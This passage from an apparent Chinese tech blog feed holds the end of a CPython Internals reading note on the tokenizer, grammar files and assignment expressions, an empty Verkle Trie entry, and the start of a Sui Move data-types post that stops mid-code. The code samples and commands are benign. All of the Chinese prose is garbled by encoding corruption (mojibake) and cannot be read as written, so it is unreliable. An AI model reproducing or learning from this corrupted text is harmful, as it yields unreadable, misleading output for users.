class="highlight text"><table><tr><td class="code"><pre><span class="line">LPAR                    &#x27;(&#x27;</span><br><span class="line">RPAR                    &#x27;)&#x27;</span><br><span class="line">LSQB                    &#x27;[&#x27;</span><br><span class="line">RSQB                    &#x27;]&#x27;</span><br><span class="line">COLON                   &#x27;:&#x27;</span><br><span class="line">COMMA                   &#x27;,&#x27;</span><br><span class="line">SEMI                    &#x27;;&#x27;</span><br></pre></td></tr></table></figure><p>å’Œ <code>Grammar</code> æ–‡ä»¶ä¸€æ ·ï¼Œå¦‚æœä½ ä¿®æ”¹äº† <code>Grammar/Tokens</code> æ–‡ä»¶ï¼Œä½ éœ€è¦é‡æ–°è¿è¡Œ <code>pgen</code>ã€‚</p><p>è¦æŸ¥çœ‹æ“ä½œä¸­çš„æ ‡è®°ï¼Œä½ å¯ä»¥ä½¿ç”¨ CPython ä¸­çš„ <code>tokenize</code> æ¨¡å—ã€‚</p><blockquote><p>CPython æºä»£ç ä¸­æœ‰ä¸¤ä¸ªæ ‡è®°å™¨ã€‚è¿™é‡Œæ¼”ç¤ºäº†ä¸€ä¸ªç”¨ Python ç¼–å†™çš„åˆ†è¯å™¨ï¼Œå¦ä¸€ä¸ªç”¨ C ç¼–å†™ã€‚ç”¨ Python ç¼–å†™çš„åˆ†è¯å™¨æ˜¯ä¸€ä¸ªå®ç”¨ç¨‹åºï¼ŒPython è§£é‡Šå™¨ä½¿ç”¨ç”¨ C ç¼–å†™çš„é‚£ä¸ªã€‚å®ƒä»¬å…·æœ‰ç›¸åŒçš„è¾“å‡ºå’Œè¡Œä¸ºã€‚ç”¨ C ç¼–å†™çš„ç‰ˆæœ¬æ˜¯ä¸ºæ€§èƒ½è€Œè®¾è®¡çš„ï¼Œè€Œ Python ä¸­çš„æ¨¡å—æ˜¯ä¸ºè°ƒè¯•è€Œè®¾è®¡çš„ã€‚</p></blockquote><p><code>cpython-book-samples/13/test_tokens.py</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Demo application</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_function</span>(): proceed</span><br></pre></td></tr></table></figure><p>å°† <code>test_tokens.py</code> æ–‡ä»¶è¾“å…¥åˆ°æ ‡å‡†åº“ä¸­å†…ç½®çš„åä¸º <code>tokenize</code> çš„æ¨¡å—ä¸­ã€‚ä½ å°†æŒ‰è¡Œå’Œå­—ç¬¦çœ‹åˆ°æ ‡è®°åˆ—è¡¨ã€‚ä½¿ç”¨ <code>-e</code> æ ‡å¿—è¾“å‡ºç¡®åˆ‡çš„æ ‡è®°åç§°ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -m tokenize -e test_tokens.py</span><br><span class="line"></span><br><span class="line">0,0-0,0:            ENCODING       <span class="string">&#x27;utf-8&#x27;</span>        </span><br><span class="line">1,0-1,18:           COMMENT        <span class="string">&#x27;# Demo application&#x27;</span></span><br><span class="line">1,18-1,19:          NL             <span class="string">&#x27;\n&#x27;</span>           </span><br><span class="line">2,0-2,3:            NAME           <span class="string">&#x27;def&#x27;</span>          </span><br><span class="line">2,4-2,15:           NAME           <span class="string">&#x27;my_function&#x27;</span>  </span><br><span class="line">2,15-2,16:          LPAR           <span class="string">&#x27;(&#x27;</span>            </span><br><span class="line">2,16-2,17:          RPAR           <span class="string">&#x27;)&#x27;</span>            </span><br><span class="line">2,17-2,18:          COLON          <span class="string">&#x27;:&#x27;</span>            </span><br><span class="line">2,18-2,19:          NEWLINE        <span class="string">&#x27;\n&#x27;</span>           </span><br><span class="line">3,0-3,4:            INDENT         <span class="string">&#x27;    &#x27;</span>         </span><br><span class="line">3,4-3,11:           NAME           <span class="string">&#x27;proceed&#x27;</span>      </span><br><span class="line">3,11-3,12:          NEWLINE        <span class="string">&#x27;\n&#x27;</span>           </span><br><span class="line">4,0-4,0:            DEDENT         <span class="string">&#x27;&#x27;</span>             </span><br><span class="line">4,0-4,0:            ENDMARKER      <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure><p>åœ¨è¾“å‡ºä¸­ï¼Œç¬¬ä¸€åˆ—æ˜¯è¡Œ/åˆ—åæ ‡çš„èŒƒå›´ï¼Œç¬¬äºŒåˆ—æ˜¯æ ‡è®°çš„åç§°ï¼Œæœ€åä¸€åˆ—æ˜¯æ ‡è®°çš„å€¼ã€‚</p><p>åœ¨è¾“å‡ºä¸­ï¼Œ <code>tokenize</code> æ¨¡å—éšå«äº†ä¸€äº›æ ‡è®°ï¼š</p><ul><li><code>utf-8</code> çš„ <code>ENCODING</code> æ ‡è®°</li><li>ç»“å°¾çš„ç©ºç™½è¡Œ</li><li><code>DEDENT</code> å…³é—­å‡½æ•°å£°æ˜</li><li><code>ENDMARKER</code> ç»“æŸæ–‡ä»¶</li></ul><p>æœ€ä½³åšæ³•æ˜¯åœ¨ Python æºæ–‡ä»¶çš„æœ«å°¾æœ‰ä¸€ä¸ªç©ºè¡Œã€‚å¦‚æœçœç•¥å®ƒï¼ŒCPython ä¼šä¸ºä½ æ·»åŠ å®ƒã€‚</p><p><code>tokenize</code> æ¨¡å—æ˜¯ç”¨çº¯ Python ç¼–å†™çš„ï¼Œä½äº <code>Lib/tokenize.py</code> ä¸­ã€‚</p><p>è¦æŸ¥çœ‹ C åˆ†è¯å™¨çš„è¯¦ç»†è¯»æ•°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <code>-d</code> æ ‡å¿—è¿è¡Œ Pythonã€‚ä½¿ç”¨ä¹‹å‰åˆ›å»ºçš„ <code>test_tokens.py</code> è„šæœ¬ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œå®ƒï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python -d test_tokens.py</span><br><span class="line"></span><br><span class="line">Token NAME/<span class="string">&#x27;def&#x27;</span> ... It<span class="string">&#x27;s a keyword</span></span><br><span class="line"><span class="string"> DFA &#x27;</span>file_input<span class="string">&#x27;, state 0: Push &#x27;</span>stmt<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> DFA &#x27;</span>stmt<span class="string">&#x27;, state 0: Push &#x27;</span>compound_stmt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Token NEWLINE/&#x27;</span><span class="string">&#x27; ... It&#x27;</span>s a token we know</span><br><span class="line"> DFA <span class="string">&#x27;funcdef&#x27;</span>, state 5: [switch func_body_suite to suite] Push <span class="string">&#x27;suite&#x27;</span></span><br><span class="line"> DFA <span class="string">&#x27;suite&#x27;</span>, state 0: Shift.</span><br><span class="line">Token INDENT/<span class="string">&#x27;&#x27;</span> ... It<span class="string">&#x27;s a token we know</span></span><br><span class="line"><span class="string"> DFA &#x27;</span>suite<span class="string">&#x27;, state 1: Shift.</span></span><br><span class="line"><span class="string">Token NAME/&#x27;</span>proceed<span class="string">&#x27; ... It&#x27;</span>s a keyword</span><br><span class="line"> DFA <span class="string">&#x27;suite&#x27;</span>, state 3: Push <span class="string">&#x27;stmt&#x27;</span></span><br><span class="line">...</span><br><span class="line">ACCEPT.</span><br></pre></td></tr></table></figure><p>åœ¨è¾“å‡ºä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒçªå‡ºæ˜¾ç¤ºäº†ä½œä¸ºå…³é”®å­—çš„ <code>proceed</code>ã€‚åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°æ‰§è¡Œ Python äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¦‚ä½•åˆ°è¾¾åˆ†è¯å™¨çš„ï¼Œä»¥åŠä»é‚£é‡Œæ‰§è¡Œä»£ç æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚</p><blockquote><p>è¦æ¸…ç†ä½ çš„ä»£ç ï¼Œè¯·æ¢å¤ <code>Grammar/Grammar</code> ä¸­çš„æ›´æ”¹ï¼Œå†æ¬¡é‡æ–°ç”Ÿæˆè¯­æ³•ï¼Œç„¶åæ¸…ç†æ„å»ºå¹¶é‡æ–°ç¼–è¯‘ï¼š</p><p>å¯¹äº macOS æˆ– Linuxï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git checkout -- Grammar/Grammar</span><br><span class="line">$ make regen-grammar</span><br><span class="line">$ make clobber</span><br><span class="line">$ make -j2 -s</span><br></pre></td></tr></table></figure><p>å¯¹äº Windowsï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">git checkout -- Grammar/Grammar</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat --regen</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat -t CleanAll</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">build.bat -t Build</span></span><br></pre></td></tr></table></figure></blockquote><h2><span id="yi-ge-geng-fu-za-de-li-zi">ä¸€ä¸ªæ›´å¤æ‚çš„ä¾‹å­</span></h2><p>æ·»åŠ  <code>proceed</code> ä½œä¸º <code>pass</code> çš„æ›¿ä»£å…³é”®å­—æ˜¯ä¸€ä¸ªç®€å•çš„æ›´æ”¹ï¼Œè§£æå™¨ç”Ÿæˆå™¨å°† <code>'proceed'</code> ä½œä¸º <code>pass_stmt</code> æ ‡è®°çš„æ–‡å­—è¿›è¡ŒåŒ¹é…ã€‚è¿™ä¸ªæ–°å…³é”®å­—æ— éœ€å¯¹ç¼–è¯‘å™¨è¿›è¡Œä»»ä½•æ›´æ”¹å³å¯å·¥ä½œã€‚</p><p>åœ¨å®è·µä¸­ï¼Œå¯¹è¯­æ³•çš„å¤§å¤šæ•°æ›´æ”¹éƒ½æ›´åŠ å¤æ‚ã€‚</p><p>Python 3.8 å¼•å…¥äº†èµ‹å€¼è¡¨è¾¾å¼ï¼Œæ ¼å¼ä¸º <code>:=</code>ã€‚èµ‹å€¼è¡¨è¾¾å¼æ—¢ä¸ºåç§°èµ‹å€¼ï¼Œåˆè¿”å›å‘½åå˜é‡çš„å€¼ã€‚å—åœ¨ Python è¯­è¨€ä¸­æ·»åŠ èµ‹å€¼è¡¨è¾¾å¼å½±å“çš„è¯­å¥ä¹‹ä¸€æ˜¯ <code>if</code> è¯­å¥ã€‚</p><p>åœ¨ 3.8 ä¹‹å‰ï¼Œ<code>if</code> è¯­å¥å®šä¹‰ä¸ºï¼š</p><ul><li>å…³é”®å­— <code>if</code> åè·Ÿ <code>test</code>ï¼Œç„¶åæ˜¯ <code>:</code></li><li>åµŒå¥—çš„ä¸€ç³»åˆ—è¯­å¥ï¼ˆ<code>suite</code>ï¼‰</li><li>é›¶ä¸ªæˆ–å¤šä¸ª <code>elif</code> è¯­å¥ï¼Œåè·Ÿ <code>test</code>ã€ä¸€ä¸ª <code>:</code> å’Œ <code>suite</code></li><li>ä¸€ä¸ªå¯é€‰çš„ <code>else</code> è¯­å¥ï¼Œåè·Ÿä¸€ä¸ª <code>:</code> å’Œä¸€ä¸ª <code>suite</code></li></ul><p>åœ¨è¯­æ³•ä¸­ï¼Œè¿™è¡¨ç¤ºä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">if_stmt: &#x27;if&#x27; test &#x27;:&#x27; suite (&#x27;elif&#x27; test &#x27;:&#x27; suite)* [&#x27;else&#x27; &#x27;:&#x27; suite]</span><br></pre></td></tr></table></figure><p>å¯è§†åŒ–ä¹‹åçœ‹èµ·æ¥åƒï¼š</p><p>ä¸ºäº†æ”¯æŒèµ‹å€¼è¡¨è¾¾å¼ï¼Œæ›´æ”¹éœ€è¦å‘åå…¼å®¹ã€‚ å› æ­¤ï¼Œåœ¨ <code>if</code> è¯­å¥ä¸­ä½¿ç”¨ <code>:=</code> å¿…é¡»æ˜¯å¯é€‰çš„ã€‚</p><p><code>if</code> è¯­å¥ä¸­ä½¿ç”¨çš„ <code>test</code> æ ‡è®°ç±»å‹åœ¨è®¸å¤šè¯­å¥ä¹‹é—´æ˜¯é€šç”¨çš„ã€‚ä¾‹å¦‚ï¼Œ<code>assert</code> è¯­å¥åè·Ÿä¸€ä¸ª <code>test</code>ï¼ˆç„¶åæ˜¯å¯é€‰çš„ç¬¬äºŒä¸ª <code>test</code>ï¼‰ã€‚</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">assert_stmt: &#x27;assert&#x27; test [&#x27;,&#x27; test]</span><br></pre></td></tr></table></figure><p>åœ¨ 3.8 ä¸­æ·»åŠ äº†æ›¿ä»£ <code>test</code> æ ‡è®°ç±»å‹ï¼Œä»¥ä¾¿è¯­æ³•å¯ä»¥è§„å®šå“ªäº›è¯­å¥åº”è¯¥æ”¯æŒèµ‹å€¼è¡¨è¾¾å¼ï¼Œå“ªäº›ä¸åº”è¯¥æ”¯æŒã€‚</p><p>è¿™ä¸ªç§°ä¸º <code>namedexpr_test</code>ï¼Œåœ¨ <code>Grammer</code> ä¸­å®šä¹‰ä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">namedexpr_test: test [&#x27;:=&#x27; test]</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼Œåœ¨é“è·¯å›¾ä¸­å¯è§†åŒ–ä¸ºï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769573-78634152-1b47-4ee8-9ca7-2f6b6e3ff4a1.png" alt="namedexpr_test"></p><p><code>if</code> è¯­å¥çš„æ–°è¯­æ³•å·²æ›´æ”¹ä¸ºç”¨ <code>namedexpr_test</code> æ›¿æ¢ <code>test</code>ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">if_stmt: &#x27;if&#x27; namedexpr_test &#x27;:&#x27; suite (&#x27;elif&#x27; namedexpr_test &#x27;:&#x27; suite)</span><br><span class="line">        [&#x27;else&#x27; &#x27;:&#x27; suite]</span><br></pre></td></tr></table></figure><p>åœ¨é“è·¯å›¾ä¸­å¯è§†åŒ–ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/130769666-b253d126-ab60-4eb5-8dd6-8e7ca3988282.png" alt="if_stmt_with_namedexpr_test"></p><p>ä¸ºäº†åŒºåˆ† <code>:=</code> å’Œç°æœ‰çš„ <code>COLON</code> (<code>:</code>) å’Œ <code>EQUAL</code> (<code>=</code>) æ ‡è®°ï¼Œå°†ä»¥ä¸‹æ ‡è®°ä¹Ÿæ·»åŠ åˆ° <code>Grammar/Tokens</code> ä¸­ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">COLONEQUAL              &#x27;:=&#x27;</span><br></pre></td></tr></table></figure><p>è¿™ä¸æ˜¯æ”¯æŒèµ‹å€¼è¡¨è¾¾å¼æ‰€éœ€çš„å”¯ä¸€æ›´æ”¹ã€‚ å¦‚ <a href="https://github.com/python/cpython/pull/10497">Pull Request</a> ä¸­æ‰€ç¤ºï¼Œè¿™ä¸€å˜åŒ–æ”¹å˜äº† CPython ç¼–è¯‘å™¨çš„è®¸å¤šéƒ¨åˆ†ã€‚</p><blockquote><p>æœ‰å…³ CPython è§£æå™¨ç”Ÿæˆå™¨çš„æ›´å¤šä¿¡æ¯ï¼Œ<code>pgen</code> çš„ä½œè€…åœ¨ PyCon Europe 2019 ä¸Šå½•åˆ¶äº†æœ‰å…³å®ç°å’Œè®¾è®¡çš„æ¼”ç¤ºæ–‡ç¨¿ï¼šâ€œ<a href="https://www.youtube.com/watch?v=1_23AVsiQEc">é‡å…½ä¹‹é­‚</a>â€ã€‚</p></blockquote><h2><span id="zong-jie">æ€»ç»“</span></h2><p>åœ¨æœ¬ç« ä¸­ï¼Œä½ å·²ç»äº†è§£äº† Python è¯­æ³•å®šä¹‰å’Œè§£æå™¨ç”Ÿæˆå™¨ã€‚åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œä½ å°†æ‰©å±•è¯¥çŸ¥è¯†ä»¥æ„å»ºæ›´å¤æ‚çš„è¯­æ³•åŠŸèƒ½ï¼Œå³â€œå‡ ä¹ç­‰äºâ€è¿ç®—ç¬¦ã€‚</p><p>åœ¨å®è·µä¸­ï¼Œå¿…é¡»ä»”ç»†è€ƒè™‘å’Œè®¨è®ºå¯¹ Python è¯­æ³•çš„æ›´æ”¹ã€‚å®¡æŸ¥æ°´å¹³æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ol><li>æ‹¥æœ‰â€œå¤ªå¤šâ€çš„è¯­è¨€ç‰¹æ€§æˆ–å¤æ‚çš„è¯­æ³•ä¼šæ”¹å˜ Python ä½œä¸ºä¸€ç§ç®€å•æ˜“è¯»çš„è¯­è¨€çš„ç²¾ç¥</li><li>è¯­æ³•æ›´æ”¹å¼•å…¥å‘åä¸å…¼å®¹ï¼Œè¿™ç»™æ‰€æœ‰å¼€å‘äººå‘˜å¢åŠ äº†å·¥ä½œ</li></ol><p>å¦‚æœ Python æ ¸å¿ƒå¼€å‘äººå‘˜æè®®å¯¹è¯­æ³•è¿›è¡Œæ›´æ”¹ï¼Œåˆ™å¿…é¡»å°†å…¶ä½œä¸º Python å¢å¼ºææ¡ˆ (PEP) æå‡ºã€‚æ‰€æœ‰ PEP éƒ½åœ¨ PEP ç´¢å¼•ä¸Šè¿›è¡Œç¼–å·å’Œç´¢å¼•ã€‚<a href="https://www.python.org/dev/peps/pep-0005/">PEP 5</a> è®°å½•äº†è¯­è¨€å‘å±•çš„æŒ‡å—ï¼Œå¹¶æŒ‡å®šå¿…é¡»åœ¨ PEP ä¸­æå‡ºæ›´æ”¹ã€‚</p><p>æˆå‘˜è¿˜å¯ä»¥é€šè¿‡ <a href="https://www.python.org/community/lists/">python-ideas é‚®ä»¶åˆ—è¡¨</a>å»ºè®®å¯¹æ ¸å¿ƒå¼€å‘ç»„ä¹‹å¤–çš„è¯­è¨€è¿›è¡Œæ›´æ”¹ã€‚</p><p>ä½ å¯ä»¥åœ¨ <a href="https://www.python.org/dev/peps/">PEP ç´¢å¼•</a>ä¸­æŸ¥çœ‹ CPython æœªæ¥ç‰ˆæœ¬çš„èµ·è‰çš„ã€æ‹’ç»çš„å’Œæ¥å—çš„ PEPã€‚ä¸€æ—¦ PEP è¾¾æˆå…±è¯†ï¼Œå¹¶ä¸”è‰æ¡ˆå·²å®šç¨¿ï¼ŒæŒ‡å¯¼å§”å‘˜ä¼šå¿…é¡»æ¥å—æˆ–æ‹’ç»å®ƒã€‚<a href="https://www.python.org/dev/peps/pep-0013/">PEP 13</a> ä¸­å®šä¹‰çš„æŒ‡å¯¼å§”å‘˜ä¼šçš„ä»»åŠ¡è§„å®šï¼Œä»–ä»¬åº”åŠªåŠ›â€œç»´æŠ¤ Python è¯­è¨€å’Œ CPython è§£é‡Šå™¨çš„è´¨é‡å’Œç¨³å®šæ€§â€ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CPython Internals ç¬”è®° â”€â”€ Python è¯­è¨€å’Œè¯­æ³•
    
    </summary>
    
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CPythonInternals" scheme="https://qiwihui.com/tags/CPythonInternals/"/>
    
  </entry>
  
  <entry>
    <title>Verkle Trie ä» 0 åˆ° 1</title>
    <link href="https://qiwihui.com/qiwihui-blog-175/"/>
    <id>https://qiwihui.com/qiwihui-blog-175/</id>
    <published>2024-05-15T02:25:31.305Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>video: TODO</p><p>docs: <a href="https://qiwihui.notion.site/Verkle-trie-8fa545dff5014191bfb6af2765b42e6e?pvs=4">https://qiwihui.notion.site/Verkle-trie-8fa545dff5014191bfb6af2765b42e6e?pvs=4</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Verkle Trie ä» 0 åˆ° 1
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Sui æ•°æ®ç±»å‹è®²è§£</title>
    <link href="https://qiwihui.com/qiwihui-blog-172/"/>
    <id>https://qiwihui.com/qiwihui-blog-172/</id>
    <published>2024-05-15T02:25:31.302Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç» Sui ä¸­å¸¸è§çš„æ•°æ®ç»“æ„ï¼Œè¿™äº›ç»“æ„åŒ…å« Sui Move å’Œ Sui Framework ä¸­æä¾›çš„åŸºç¡€ç±»å‹å’Œæ•°æ®ç»“æ„ï¼Œç†è§£å’Œç†Ÿæ‚‰è¿™äº›æ•°æ®ç»“æ„å¯¹äº Sui Move çš„ç†è§£å’Œåº”ç”¨å¤§æœ‰è£¨ç›Šã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆå¿«é€Ÿå¤ä¹ ä¸€ä¸‹ Sui Move ä¸­ä½¿ç”¨åˆ°çš„åŸºç¡€ç±»å‹ã€‚</p><h3><span id="wu-fu-hao-zheng-xing-integer">æ— ç¬¦å·æ•´å‹ï¼ˆIntegerï¼‰</span></h3><p>Move åŒ…å«å…­ç§æ— ç¬¦å·æ•´å‹ï¼š<code>u8</code>ï¼Œ<code>u16</code> <code>u32</code>ï¼Œ<code>u64</code>ï¼Œ<code>u128</code>å’Œ <code>u256</code>ã€‚å€¼çš„èŒƒå›´ä» 0 åˆ° ä¸ç±»å‹å¤§å°ç›¸å…³çš„æœ€å¤§å€¼ã€‚</p><p>è¿™äº›ç±»å‹çš„å­—é¢å€¼ä¸ºæ•°å­—åºåˆ—ï¼ˆä¾‹å¦‚ 112ï¼‰æˆ–åå…­è¿›åˆ¶æ–‡å­—ï¼Œä¾‹å¦‚ <code>0xFF</code>ã€‚ å­—é¢å€¼çš„ç±»å‹å¯ä»¥é€‰æ‹©æ·»åŠ ä¸ºåç¼€ï¼Œä¾‹å¦‚ <code>112u8</code>ã€‚ å¦‚æœæœªæŒ‡å®šç±»å‹ï¼Œç¼–è¯‘å™¨å°†å°è¯•ä»ä½¿ç”¨æ–‡å­—çš„ä¸Šä¸‹æ–‡ä¸­æ¨æ–­ç±»å‹ã€‚ å¦‚æœæ— æ³•æ¨æ–­ç±»å‹ï¼Œåˆ™å‡å®šä¸º <code>u64</code>ã€‚</p><p>å¯¹æ— ç¬¦å·æ•´å‹æ”¯æŒçš„è¿ç®—åŒ…æ‹¬ï¼š</p><ul><li>ç®—æ•°è¿ç®—ï¼š <code>+</code> <code>-</code>  <code>*</code>  <code>%</code> <code>/</code></li><li>ä½è¿ç®—ï¼š <code>&amp;</code> <code>|</code> <code>^</code>  <code>&gt;&gt;</code> <code>&lt;&lt;</code></li><li>æ¯”è¾ƒè¿ç®—ï¼š <code>&gt;</code> <code>&lt;</code> <code>&gt;=</code> <code>&lt;=</code>  <code>==</code> <code>!=</code></li><li>ç±»å‹è½¬æ¢ï¼š <code>as</code><ul><li>æ³¨æ„ï¼Œç±»å‹è½¬æ¢ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤å¦‚æœç»“æœå¯¹äºæŒ‡å®šç±»å‹è€Œè¨€å¤ªå¤§ï¼Œè½¬æ¢å°†ä¸­æ­¢ã€‚</li></ul></li></ul><p>ç®€å•ç¤ºä¾‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: <span class="type">u64</span> = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = <span class="number">2u64</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">hex_u64</span>: <span class="type">u64</span> = <span class="number">0xCAFE</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">assert!</span>(a+b==<span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">assert!</span>(a-b==<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">assert!</span>(a*b==<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">assert!</span>(a/b==<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">complex_u8</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">_unused</span> = <span class="number">10</span> &lt;&lt; complex_u8;</span><br><span class="line"></span><br><span class="line">(b <span class="keyword">as</span> <span class="type">u128</span>)</span><br></pre></td></tr></table></figure><h3><span id="bu-er-lei-xing-bool">å¸ƒå°”ç±»å‹ï¼ˆBoolï¼‰</span></h3><p>Move å¸ƒå°”å€¼åŒ…å«ä¸¤ç§ï¼Œ<code>true</code> å’Œ <code>false</code> ã€‚æ”¯æŒä¸ <code>&amp;&amp;</code>ï¼Œæˆ–<code>||</code>  å’Œé <code>!</code> è¿ç®—ã€‚å¯ä»¥ç”¨äº Move çš„æ§åˆ¶æµå’Œ <code>assert!</code> ä¸­ã€‚ <code>assert!</code> æ˜¯ Move æä¾›çš„ç”¨äºæ–­è¨€ï¼Œå½“åˆ¤æ–­çš„å€¼æ˜¯ <code>false</code> æ—¶ï¼Œç¨‹åºä¼šæŠ›å‡ºé”™è¯¯å¹¶åœæ­¢ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="type">bool</span>) &#123; ... &#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="type">bool</span>) &#123; .. &#125;</span><br><span class="line"><span class="built_in">assert!</span>(<span class="type">bool</span>, <span class="type">u64</span>)</span><br></pre></td></tr></table></figure><h3><span id="di-zhi-address">åœ°å€ï¼ˆAddressï¼‰</span></h3><p>address ä¹Ÿæ˜¯ Move çš„åŸç”Ÿç±»å‹ï¼Œå¯ä»¥åœ¨åœ°å€ä¸‹ä¿å­˜æ¨¡å—å’Œèµ„æºã€‚Sui ä¸­åœ°å€çš„é•¿åº¦ä¸º 20 å­—èŠ‚ã€‚</p><p>åœ¨è¡¨è¾¾å¼ä¸­ï¼Œåœ°å€éœ€è¦ä½¿ç”¨å‰ç¼€ <code>@</code> ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a1</span>: address = @<span class="number">0xDEADBEEF</span>; <span class="comment">// shorthand for 0x00000000000000000000000000000000DEADBEEF</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a2</span>: address = @<span class="number">0x0000000000000000000000000000000000000002</span>;</span><br></pre></td></tr></table></figure><h3><span id="tuples-he-unit">Tuples å’Œ Unit</span></h3><p>Tuples å’Œ Unit <code>()</code> åœ¨ Move ä¸­ä¸»è¦ç”¨ä½œå‡½æ•°è¿”å›å€¼ã€‚åªæ”¯æŒè§£æ„ï¼ˆdestructuringï¼‰è¿ç®—ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::tuples &#123;</span><br><span class="line">    <span class="comment">// all 3 of these functions are equivalent</span></span><br><span class="line">    fun <span class="title function_ invoke__">returns_unit</span>() &#123;&#125;</span><br><span class="line">    fun <span class="title function_ invoke__">returns_2_values</span>(): (<span class="type">bool</span>, <span class="type">bool</span>) &#123; (<span class="literal">true</span>, <span class="literal">false</span>) &#125;</span><br><span class="line">    fun <span class="title function_ invoke__">returns_4_values</span>(x: &amp;<span class="type">u64</span>): (&amp;<span class="type">u64</span>, <span class="type">u8</span>, <span class="type">u128</span>, vector&lt;<span class="type">u8</span>&gt;) &#123; (x, <span class="number">0</span>, <span class="number">1</span>, <span class="string">b&quot;foobar&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">examples</span>(cond: <span class="type">bool</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> () = ();</span><br><span class="line">        <span class="keyword">let</span> (x, y): (<span class="type">u8</span>, <span class="type">u64</span>) = (<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> (a, b, c, d) = (@<span class="number">0x0</span>, <span class="number">0</span>, <span class="literal">false</span>, <span class="string">b&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        () = ();</span><br><span class="line">        (x, y) = <span class="keyword">if</span> (cond) (<span class="number">1</span>, <span class="number">2</span>) <span class="keyword">else</span> (<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">        (a, b, c, d) = (@<span class="number">0x1</span>, <span class="number">1</span>, <span class="literal">true</span>, <span class="string">b&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">examples_with_function_calls</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> () = <span class="title function_ invoke__">returns_unit</span>();</span><br><span class="line">        <span class="keyword">let</span> (x, y): (<span class="type">bool</span>, <span class="type">bool</span>) = <span class="title function_ invoke__">returns_2_values</span>();</span><br><span class="line">        <span class="keyword">let</span> (a, b, c, d) = <span class="title function_ invoke__">returns_4_values</span>(&amp;<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        () = <span class="title function_ invoke__">returns_unit</span>();</span><br><span class="line">        (x, y) = <span class="title function_ invoke__">returns_2_values</span>();</span><br><span class="line">        (a, b, c, d) = <span 